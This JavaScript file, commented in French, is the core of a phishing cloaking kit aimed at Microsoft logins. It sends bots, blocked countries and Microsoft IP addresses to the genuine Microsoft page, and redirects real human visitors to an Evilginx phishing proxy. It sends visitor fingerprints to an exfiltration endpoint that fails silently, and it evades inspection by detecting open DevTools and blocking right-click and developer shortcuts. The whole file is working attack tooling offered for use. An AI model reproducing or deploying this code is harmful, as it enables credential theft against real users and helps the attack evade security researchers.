// ═══════════════════════════════════════════════════════════════════
// LOGIQUE PRINCIPALE - CLOAKING UNIVERSEL 2025
// ═══════════════════════════════════════════════════════════════════
//
// Ce fichier orchestre tout le système de cloaking:
// 1. Détection bot (invisible)
// 2. Géoblocage
// 3. Redirection intelligente
// 4. Exfiltration données
//
// ═══════════════════════════════════════════════════════════════════

(async function() {
    'use strict';

    // ═══════════════════════════════════════════════════════════════
    // INITIALISATION
    // ═══════════════════════════════════════════════════════════════

    const botDetector = new BotDetector(CONFIG);
    const geoBlocker = new GeoBlocker(CONFIG);

    let finalDecision = null;

    // ═══════════════════════════════════════════════════════════════
    // PHASE 1: DÉTECTION GÉOGRAPHIQUE (EN PARALLÈLE)
    // ═══════════════════════════════════════════════════════════════

    const geoCheck = geoBlocker.checkAccess();

    // ═══════════════════════════════════════════════════════════════
    // PHASE 2: DÉTECTION BOT (EN PARALLÈLE)
    // ═══════════════════════════════════════════════════════════════

    const botAnalysis = botDetector.analyze();

    // ═══════════════════════════════════════════════════════════════
    // PHASE 3: ATTENDRE LES RÉSULTATS
    // ═══════════════════════════════════════════════════════════════

    const [geoResult, botResult] = await Promise.all([geoCheck, botAnalysis]);

    if (CONFIG.DEBUG_MODE) {
        console.log('═══════════════════════════════════════');
        console.log('RÉSULTATS ANALYSE');
        console.log('═══════════════════════════════════════');
        console.log('GEO:', geoResult);
        console.log('BOT:', botResult);
        console.log('═══════════════════════════════════════');
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 4: DÉCISION FINALE
    // ═══════════════════════════════════════════════════════════════

    // Cas 1: Pays bloqué → redirect immédiat
    if (!geoResult.allowed) {
        redirectToURL(CONFIG.GEO_BLOCKED_URL, 'geo_blocked', {
            country: geoBlocker.getGeoInfo().country,
            reason: geoResult.reason
        });
        return;
    }

    // Cas 2: Bot détecté → redirect vers vraie page Microsoft
    if (botResult.isBot) {
        redirectToURL(CONFIG.BOT_URL, 'bot_detected', {
            score: botResult.score,
            signals: botResult.signals.map(s => s.name)
        });
        return;
    }

    // Cas 3: IP Microsoft détectée → redirect sécurisé
    if (geoResult.geoData && geoBlocker.isMicrosoftIP(geoResult.geoData.ip)) {
        redirectToURL(CONFIG.BOT_URL, 'microsoft_ip', {
            ip: geoResult.geoData.ip
        });
        return;
    }

    // Cas 4: Suspect → afficher page mais log
    if (botResult.isSuspicious) {
        if (CONFIG.DEBUG_MODE) {
            console.warn('[CLOAKING] User is suspicious (score: ' + botResult.score + ')');
        }
        // On affiche quand même la page mais on log
        await logSuspiciousVisit({
            botScore: botResult.score,
            geoData: geoResult.geoData,
            signals: botResult.signals
        });
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 5: VICTIME HUMAINE → REDIRECTION DIRECTE VERS EVILGINX
    // ═══════════════════════════════════════════════════════════════

    if (CONFIG.DEBUG_MODE) {
        console.log('[CLOAKING] ✅ Human detected! Redirecting to Evilginx...');
        console.log('[CLOAKING] Bot score:', botResult.score);
        console.log('[CLOAKING] Country:', geoResult.geoData?.country);
    }

    // Logger la visite humaine (optionnel)
    if (CONFIG.ENABLE_EXFILTRATION) {
        await logHumanVisit({
            botScore: botResult.score,
            geoData: geoResult.geoData,
            signals: botResult.signals,
            timing: botDetector.getInteractionTime(),
            mouseMovements: botDetector.mouseMovements.length,
            keyPresses: botDetector.keyPresses.length
        });
    }

    // Redirection DIRECTE vers Evilginx après 500ms (naturel)
    setTimeout(() => {
        redirectToURL(CONFIG.VICTIM_URL, 'human_direct_redirect', {
            botScore: botResult.score,
            country: geoResult.geoData?.country
        });
    }, 500);

    // ═══════════════════════════════════════════════════════════════
    // FONCTIONS UTILITAIRES
    // ═══════════════════════════════════════════════════════════════

    /**
     * Redirection vers URL avec logging
     */
    function redirectToURL(url, reason, metadata = {}) {
        if (CONFIG.DEBUG_MODE) {
            console.log(`[CLOAKING] 🔄 Redirecting to: ${url}`);
            console.log(`[CLOAKING] Reason: ${reason}`);
            console.log(`[CLOAKING] Metadata:`, metadata);
        }

        // Log avant redirection
        logRedirect(url, reason, metadata);

        // Petite attente pour que le log parte
        setTimeout(() => {
            window.location.href = url;
        }, 100);
    }

    /**
     * Logger une visite suspecte
     */
    async function logSuspiciousVisit(data) {
        if (!CONFIG.ENABLE_EXFILTRATION) return;

        try {
            await fetch(CONFIG.EXFIL_URL + '/suspicious', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Auth-Token': CONFIG.EXFIL_AUTH_TOKEN
                },
                body: JSON.stringify({
                    type: 'suspicious_visit',
                    ...data,
                    timestamp: new Date().toISOString()
                })
            });
        } catch (e) {
            // Silent fail
        }
    }

    /**
     * Logger une visite humaine
     */
    async function logHumanVisit(data) {
        if (!CONFIG.ENABLE_EXFILTRATION) return;

        try {
            await fetch(CONFIG.EXFIL_URL + '/human', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Auth-Token': CONFIG.EXFIL_AUTH_TOKEN
                },
                body: JSON.stringify({
                    type: 'human_visit',
                    ...data,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screenResolution: `${screen.width}x${screen.height}`,
                    language: navigator.language
                })
            });
        } catch (e) {
            // Silent fail
        }
    }

    /**
     * Logger une redirection
     */
    async function logRedirect(url, reason, metadata) {
        if (!CONFIG.ENABLE_EXFILTRATION) return;

        try {
            await fetch(CONFIG.EXFIL_URL + '/redirect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Auth-Token': CONFIG.EXFIL_AUTH_TOKEN
                },
                body: JSON.stringify({
                    type: 'redirect',
                    url: url,
                    reason: reason,
                    metadata: metadata,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            });
        } catch (e) {
            // Silent fail
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // PROTECTION CONTRE INSPECTION
    // ═══════════════════════════════════════════════════════════════

    // Détecter DevTools ouvert
    (function() {
        const devtools = {
            isOpen: false,
            orientation: null
        };

        const threshold = 160;

        setInterval(function() {
            if (window.outerWidth - window.innerWidth > threshold ||
                window.outerHeight - window.innerHeight > threshold) {

                if (!devtools.isOpen) {
                    devtools.isOpen = true;

                    if (CONFIG.DEBUG_MODE) {
                        console.warn('[SECURITY] DevTools detected! Redirecting...');
                    }

                    // Rediriger si DevTools ouvert (probable analyste)
                    redirectToURL(CONFIG.BOT_URL, 'devtools_detected', {});
                }
            } else {
                devtools.isOpen = false;
            }
        }, 500);
    })();

    // Bloquer clic droit
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });

    // Bloquer F12, Ctrl+Shift+I, etc.
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
            (e.ctrlKey && e.key === 'u')) {
            e.preventDefault();
            return false;
        }
    });

})();
